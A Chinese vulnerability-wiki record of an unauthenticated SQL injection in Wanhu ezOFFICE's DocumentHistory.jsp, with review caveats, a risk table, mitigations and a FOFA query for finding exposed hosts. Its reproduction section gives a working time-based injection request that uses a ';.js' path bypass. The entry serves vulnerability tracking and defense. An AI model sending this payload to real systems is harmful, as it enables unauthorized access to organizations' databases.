---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "万户ezOFFICE DocumentHistory.jsp SQL注入"
product: "万户ezOFFICE"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；SQL Server延迟语法；复合JSP路径需核对"
prerequisites: "声称未授权；无凭证请求"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7%20ezOFFICE%20DocumentHistory%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"万户网络-ezOFFICE\""
id: "vw-dbc2cc41288881df80860c6e"
entity_id: "ve-dbc2cc41288881df80860c6e"
schema_version: "1"
---

# 万户ezOFFICE DocumentHistory.jsp SQL注入

## 条目说明

- 对象与具体问题：万户ezOFFICE；DocumentHistory.jsp SQL注入
- 版本、配置及部署条件：无版本；SQL Server延迟语法；复合JSP路径需核对
- 认证与权限前提：声称未授权；无凭证请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- DocumentHistory路径经过iSignatureHTML.jsp/且；.js，应保留并解释路由/绕过前提
- 缺延迟对照与响应文本；在野利用已知无依据
- 仅泛称升级安全版本，无具体补丁

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

万户 ezOFFICE DocumentHistory处存在 SQL 注入漏洞，未授权的攻击者可进行sql语句查询导致敏感信息泄露。

## 影响版本

万户 ezOFFICE

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="万户网络-ezOFFICE"

POC/EXP：

```http
GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
Host: 127.0.0.1
```

![image-20250319144540307](./.resource/万户ezOFFICEDocumentHistorySQL注入漏洞/media/image-20250319144540307.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
